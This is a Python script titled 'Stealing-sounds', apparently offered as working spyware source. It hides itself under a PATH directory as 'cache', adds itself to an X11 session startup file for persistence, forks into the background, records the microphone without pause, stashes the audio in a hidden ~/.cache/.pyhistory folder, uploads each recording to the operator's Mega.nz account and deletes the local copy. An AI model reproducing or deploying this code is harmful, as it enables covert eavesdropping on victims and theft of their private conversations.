#!/usr/bin/env python3.6
#######################
#   Stealing-sounds   #
#######################

#!/usr/bin/env python3.6
from time import ctime
from sys import implementation, platform, argv
from shutil import move
from os import environ, path, mkdir, remove, fork, _exit, EX_OK, chmod
from concurrent.futures import ThreadPoolExecutor as TPPE

class Install(object):
    def __init__(self):
        self.sc = argv[0] # name the script
        # Join two or more pathname components, inserting '/' as needed. 
        self.old = path.join(
            # D.get(k[,d]) -> D[k] if k in D, else d. d defaults to None.
            environ.get('PATH').split(':')[1],
            'cache'
        )

    def getInstall(self):
        if not platform.startswith('win'):
            if path.isfile(self.old): return None
            # Change the access permissions of a file.
            chmod(
                self.sc,
                0x309 
            )
            # Recursively move a file or directory to another location.
            move(
                self.sc,
                self.old
                
            )
            return True
        
            

class Upload(object):
    def __init__(self):
        self.user       = 'Your Email Address' # Your Email in Mega.nz
        self.password   = 'Your Password' # Your Password in Mega.nz
        self.Error      = lambda lib: ImportError(f"Please install \
        {lib} or write\npython3 -m pip install -r requirements.txt ") # Error Import Models
            
    def LoginAndUploadFileTarget(self, file):
        try:
            from mega import Mega
            up = Mega()
        except ImportError:
            raise self.Error("mega.py")
            exit(0)

        try:
            m_login = up.login(
                email=self.user,
                password=self.password
            )
            m_login.upload(file)
            return file

        except Exception as e:
            return None

class Daemon:
    def daemon(func):
        def wrapper(*args, **kwargs):
            if fork(): return
            func(*args, **kwargs)
            _exit(EX_OK)
        return wrapper

    def backDaemon():
        path = '/etc/X11/Xsession.d/50x11-common_determine-startup'
        try:
            if '0x00' not in open(path, 'r').read(): open(path, 'a').write('cache')
        except FileNotFoundError:
            exit(0)

class MicrophoneListing(Upload):
    """
    Creates a new ``Microphone`` instance, which represents a physical microphone
    on the computer. Subclass of ``AudioSource``.
    This will throw an ``AttributeError`` 
    if you don't have PyAudio 0.2.11 or later installed.
    If ``device_index`` is unspecified or ``None``, the default microphone is 
    used as the audio source. Otherwise, ``device_index`` should be the index of 
    the device to use for audio input.
    """
    def __init__(self):
        try:
            from requests import get

            # if the target connect in internet 
            try: get('https://www.google.com')
            except Exception:
                exit(0)
                
        except ImportError:
            raise self.Error("requests")
            exit(0)
        
        try:
            """
            Creates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.
            """

            from speech_recognition import Recognizer, Microphone
            self.rc = Recognizer()
            self.mc = Microphone() # Creates a new Microphone
        except ImportError:
            raise self.Error("SpeechRecognition")
            
        
        # Number Packet
        self.cou= int()
        
    def listing(self):
        """
        Records a single phrase from source (an AudioSource instance) into an AudioData instance, which it returns.
        This is done by waiting until the audio has an energy above recognizer_instance.energy_threshold 
        (the user has started speaking), and then recording until it encounters recognizer_instance.pause_threshold
        seconds of non-speaking or there is no more audio input. The ending silence is not included.
        The timeout parameter is the maximum number of seconds that this will wait for a phrase to start
        before giving up and throwing an speech_recognition.WaitTimeoutError exception. 
        If timeout is None, there will be no wait timeout.
        """
        with self.mc as source:
            audio = self.rc.listen(
                source,
                timeout=50
            )
            return audio
    
    def processing(self, *args, **kwargs):
        """
        Returns a byte string representing the contents of a WAV file containing 
        the audio represented by the AudioData instance.
        If convert_width is specified and the audio samples are not convert_width 
        bytes each, the resulting audio is converted to match.
        If convert_rate is specified and the audio sample rate is not convert_rate
        Hz, the resulting audio is resampled to match.
        Writing these bytes directly to a file results in a valid WAV file 
        <https://en.wikipedia.org/wiki/WAV>__.
        """
        data, *_ = args
        assert data.get_wav_data
        try:
            packet = data.get_wav_data(
                convert_rate=None,
                convert_width=None
            )
            # Step[1] : Save packet 
            try_save = self.save(packet)
            if try_save:
                # Step[2] : Upload packet 
                try_upload = self.LoginAndUploadFileTarget(try_save)
                
                if try_upload:
                    # Step[3] : Delete packet  
                    self.delete(try_upload)
        except Exception as e:
            pass


    def threading(self, *args, **kwargs):
        """Initializes a new ProcessPoolExecutor instance.

        Args:
            max_workers: The maximum number of processes that can be used to
                execute the given calls. If None or not given then as many
                worker processes will be created as the machine has processors.
        """
        data, *_ = args
        with TPPE() as obj2:  # ThreadPoolExecutor() --> obj2
            rSet = obj2.submit(self.processing, data)
        

    def save(self, *args, **kwargs):
        """Save file wav in pc target"""
        packet, *_ = args
        
        try:
            # -> /{DIRHOME}/.cache/.pyhistory 
            name_path       = path.join(environ.get('HOME'), '.cache', '.pyhistory')
            # -> {NameSystem}-{TimeNow}.wav
            name_file       = f'{self.cou}-{implementation._multiarch}-{ctime().split()[-2]}'
            # -> /{DIRHOME}/.cache/.pyhistory/{Num}-{NameSystem}-{TimeNow}.wav
            name_end_target = path.join(name_path, name_file)
            
            if not path.isdir(name_path): mkdir(name_path)
            open(name_end_target, 'wb').write(packet)
            return name_end_target

        except Exception as e:
            return None
    

    def delete(self, *args, **kwargs):
        """Delete file wav in pc target"""
        file_target_delete, *_ = args
        
        try: remove(file_target_delete)
        except FileNotFoundError: pass

    def main(self):
        """
        Loop All Time for ``listing`` in while   
        """
        while True:
            self.cou += 1
            packet = self.listing()
            self.threading(packet)


@Daemon.daemon
def main():
    obj     = MicrophoneListing()
    try:
        obj.main()
    except Exception: 
        pass
    
    
if __name__ == "__main__":

    # Start Install 
    obj2    = Install()
    if not platform.startswith('win'):
        try_in = obj2.getInstall() # Install Tools
        if try_in:
            Daemon.backDaemon()  # set Virus run startup system
    # Start Script
    main() 
    # [+] Listing...
